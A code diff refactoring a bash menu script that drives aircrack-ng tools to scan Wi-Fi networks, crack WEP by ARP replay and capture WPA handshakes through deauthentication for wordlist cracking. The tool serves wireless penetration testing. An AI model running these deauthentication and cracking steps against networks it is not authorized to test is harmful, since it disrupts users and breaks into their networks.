@@ -2,17 +2,15 @@
 
 # by Lee Baird @discoverscripts
 
-set -euo pipefail
-
 trap cleanup EXIT
 
 # Global Variables
-interface=""
-monitor=""
-pid_aireplay=""
-pid_airodump=""
-scanfile="$HOME/wtf-data/scan"
-workdir="$HOME/wtf-data"
+INTERFACE=""
+MONITOR=""
+PID_AIREPLAY=""
+PID_AIRODUMP=""
+SCANFILE="$HOME/wtf-data/scan"
+WORKDIR="$HOME/wtf-data"
 
 BLUE='\033[1;34m'
 GREEN='\033[0;32m'
@@ -21,7 +19,6 @@ YELLOW='\033[1;33m'
 NC='\033[0m'
 
 banner(){
-    clear
     echo
     echo -e "${YELLOW}
 __          __  _________   _________
@@ -60,9 +57,9 @@ dependencies() {
     echo -e "${BLUE}[*] Required tools installed.${NC}"
 
     # Check for wireless interface
-    interface=$(iw dev | awk '$1=="Interface"{print $2}' || true)
+    INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' || true)
 
-    if [ -z "$interface" ]; then
+    if [ -z "$INTERFACE" ]; then
         echo
         echo -e "${RED}[!] No wireless device found.${NC}"
         echo
@@ -74,9 +71,9 @@ dependencies() {
 
 start_monitor_mode() {
     # Check for wireless interface
-    interface=$(iw dev | awk '$1=="Interface"{print $2}' || true)
+    INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' || true)
 
-    if [ -z "$interface" ]; then
+    if [ -z "$INTERFACE" ]; then
         echo
         echo -e "${RED}[!] No wireless device found.${NC}"
         echo
@@ -91,22 +88,22 @@ start_monitor_mode() {
     echo -e "${BLUE}[*] Enabling monitor mode.${NC}"
 
     # Enable monitor mode on the interface
-    airmon-ng start "$interface" | sed '/^$/d'
+    airmon-ng start "$INTERFACE" | sed '/^$/d'
 
     # Wait to ensure the interface switches to monitor mode
     sleep 2
 
     # Check if the interface is in monitor
-    mode=$(iwconfig "$interface" 2>/dev/null | grep "Mode:Monitor")
+    MODE=$(iwconfig "$INTERFACE" 2>/dev/null | grep "Mode:Monitor")
 
-    if [ -z "$mode" ]; then
+    if [ -z "$MODE" ]; then
         echo
-        echo -e "${RED}[!] Failed to enable monitor mode on interface: $interface.${NC}"
+        echo -e "${RED}[!] Failed to enable monitor mode on interface: $INTERFACE.${NC}"
         echo
         exit 1
     else
-        monitor="$interface"  # Keep using the same interface name
-        echo -e "${BLUE}[*] Monitor mode enabled on interface:${NC} ${GREEN}$monitor${NC}"
+        MONITOR="$INTERFACE"  # Keep using the same interface name
+        echo -e "${BLUE}[*] Monitor mode enabled on interface:${NC} ${GREEN}$MONITOR${NC}"
     fi
 
     echo
@@ -115,40 +112,40 @@ start_monitor_mode() {
     banner; main_menu
 }
 
-if [ ! -d "$workdir" ]; then
-    mkdir -p "$workdir"
+if [ ! -d "$WORKDIR" ]; then
+    mkdir -p "$WORKDIR"
 fi
 
 scan_networks() {
     echo
     echo -e "${BLUE}[*] Scanning for wireless networks.${NC}"
-    echo -e "${BLUE}[*] Using monitor interface:${NC} ${GREEN}$monitor${NC}"
+    echo -e "${BLUE}[*] Using monitor interface:${NC} ${GREEN}$MONITOR${NC}"
 
-    airodump-ng "$monitor" --output-format csv -w "$scanfile" &> "$workdir/airodump.log" &
-    pid_airodump=$!
+    airodump-ng "$MONITOR" --output-format csv -w "$SCANFILE" &> "$WORKDIR/airodump.log" &
+    PID_AIRODUMP=$!
 
     # Increase the sleep time to capture more data
     sleep 10
 
     # Check if the process is still running before trying to kill it
-    if kill -0 "$pid_airodump" &>/dev/null; then
-        kill "$pid_airodump"
+    if kill -0 "$PID_AIRODUMP" &>/dev/null; then
+        kill "$PID_AIRODUMP"
     else
         echo -e "${RED}[!] airodump-ng process is not running.${NC}"
     fi
 
     # Check if the scan file exists
-    if [ -f "${scanfile}-01.csv" ]; then
+    if [ -f "${SCANFILE}-01.csv" ]; then
         echo
-        echo -e "${BLUE}[*] Scan complete. Data saved to ${scanfile}-01.csv.${NC}"
+        echo -e "${BLUE}[*] Scan complete. Data saved to ${SCANFILE}-01.csv.${NC}"
         echo
         echo -e "${YELLOW}[*] Displaying results:${NC}"
-        awk -F, 'NR > 2 && $1 ~ /[0-9a-fA-F:]/ {print "BSSID: " $1, " | Channel: " $4, " | Encryption: " $6, " | ESSID: " $14}' "${scanfile}-01.csv" | column -t
+        awk -F, 'NR > 2 && $1 ~ /[0-9a-fA-F:]/ {print "BSSID: " $1, " | Channel: " $4, " | Encryption: " $6, " | ESSID: " $14}' "${SCANFILE}-01.csv" | column -t
     else
         echo
         echo -e "${RED}[!] No wireless networks found or failed to write data.${NC}"
         echo
-        echo -e "${YELLOW}Check $workdir/airodump.log for errors.${NC}"
+        echo -e "${YELLOW}Check $WORKDIR/airodump.log for errors.${NC}"
     fi
     
     echo
@@ -160,36 +157,36 @@ scan_networks() {
 crack_wep() {
     echo
     echo -e "${BLUE}[*] Running airodump-ng to find WEP targets.${NC}"
-    airodump-ng --encrypt WEP "$monitor"
+    airodump-ng --encrypt WEP "$MONITOR"
     echo
     echo -n "BSSID: "
-    read -r bssid
+    read -r BSSID
     echo -n "Channel: "
-    read -r channel
+    read -r CHANNEL
     echo -n "Client MAC address: "
-    read -r client
+    read -r CLIENT
 
-    if [ -z "$bssid" ] || [ -z "$channel" ]; then
+    if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
         echo
         echo -e "${RED}[!] Missing data.${NC}"
         cleanup
     fi
 
-    if [ -z "$client" ]; then
-        client="ff:ff:ff:ff:ff:ff"
+    if [ -z "$CLIENT" ]; then
+        CLIENT="ff:ff:ff:ff:ff:ff"
     fi
 
-    xterm -e "airodump-ng $monitor --bssid $bssid --channel $channel --write wep_capture" &
-    pid_airodump=$!
+    xterm -e "airodump-ng $MONITOR --bssid $BSSID --channel $CHANNEL --write wep_capture" &
+    PID_AIRODUMP=$!
     sleep 5
-    xterm -e "aireplay-ng $monitor --arpreplay -b $bssid -h $client" &
-    pid_aireplay=$!
+    xterm -e "aireplay-ng $MONITOR --arpreplay -b $BSSID -h $CLIENT" &
+    PID_AIREPLAY=$!
 
     echo
     echo -e "${BLUE}[*] Gathering data for WEP cracking.${NC}"
     sleep 60  # Capture data
     
-    if aircrack-ng -b "$bssid" wep_capture*.cap; then
+    if aircrack-ng -b "$BSSID" wep_capture*.cap; then
         echo
         echo -e "${YELLOW}[*] WEP cracked successfully.${NC}"
     else
@@ -203,26 +200,26 @@ crack_wep() {
 crack_wpa() {
     echo
     echo -e "${BLUE}[*] Running airodump-ng to find WPA targets.${NC}"
-    airodump-ng --encrypt WEP "$monitor"
+    airodump-ng --encrypt WEP "$MONITOR"
     echo
     echo -n "BSSID: "
-    read -r bssid
+    read -r BSSID
     echo -n "Channel: "
-    read -r channel
+    read -r CHANNEL
     echo -n "Client MAC address: "
-    read -r client
+    read -r CLIENT
 
-    if [ -z "$bssid" ] || [ -z "$channel" ]; then
+    if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
         echo
         echo -e "${RED}[!] Missing data.${NC}"
         cleanup
     fi
 
-    xterm -e "airodump-ng $monitor --bssid $bssid --channel $channel --write wpa_capture" &
-    pid_airodump=$!
+    xterm -e "airodump-ng $MONITOR --bssid $BSSID --channel $CHANNEL --write wpa_capture" &
+    PID_AIRODUMP=$!
     sleep 5
-    xterm -e "aireplay-ng $monitor --deauth 10 -a $bssid" &
-    pid_aireplay=$!
+    xterm -e "aireplay-ng $MONITOR --deauth 10 -a $BSSID" &
+    PID_AIREPLAY=$!
 
     echo
     echo -e "${BLUE}[*] Capturing handshake for WPA cracking.${NC}"
@@ -236,23 +233,23 @@ crack_wpa() {
 
     echo
     echo -n "Enter the path to your wordlist: "
-    read -r wordlist
+    read -r WORDLIST
 
-    if [ -z "$wordlist" ]; then
+    if [ -z "$WORDLIST" ]; then
         echo
         echo -e "${RED}[!] No data entered.${NC}"
         echo
         exit 1
     fi
 
-    if [ ! -f "$wordlist" ]; then
+    if [ ! -f "$WORDLIST" ]; then
         echo
         echo -e "${RED}[!] The file does not exist.${NC}"
         echo
         exit 1
     fi
 
-    if aircrack-ng -w "$wordlist" wpa_capture*.cap; then
+    if aircrack-ng -w "$WORDLIST" wpa_capture*.cap; then
         echo
         echo -e "${YELLOW}[*] WPA cracked successfully.${NC}"
         cleanup
@@ -266,18 +263,18 @@ crack_wpa() {
 
 cleanup() {
     # Reset PIDs after killing them
-    if [ -n "${pid_airodump:-}" ]; then
-        kill "$pid_airodump" &>/dev/null || true
-        pid_airodump=""
+    if [ -n "${PID_AIRODUMP:-}" ]; then
+        kill "$PID_AIRODUMP" &>/dev/null || true
+        PID_AIRODUMP=""
     fi
 
-    if [ -n "${pid_aireplay:-}" ]; then
-        kill "$pid_aireplay" &>/dev/null || true
-        pid_aireplay=""
+    if [ -n "${PID_AIREPLAY:-}" ]; then
+        kill "$PID_AIREPLAY" &>/dev/null || true
+        PID_AIREPLAY=""
     fi
 
     # Reset wireless interface
-    airmon-ng stop $interface &>/dev/null
+    airmon-ng stop "$INTERFACE" &>/dev/null
 
     echo
     echo
@@ -287,7 +284,7 @@ cleanup() {
 }
 
 main_menu() {
-    echo -e "${BLUE}[*] Wireless interface:${NC} ${GREEN}$interface${NC}"
+    echo -e "${BLUE}[*] Wireless interface:${NC} ${GREEN}$INTERFACE${NC}"
 
     while true; do
         echo
@@ -298,9 +295,9 @@ main_menu() {
         echo "5. Exit"
         echo
         echo -n "Choice: "
-        read -r choice
+        read -r CHOICE
 
-        case $choice in
+        case "$CHOICE" in
             1) start_monitor_mode ;;
             2) scan_networks ;;
             3) crack_wep ;;
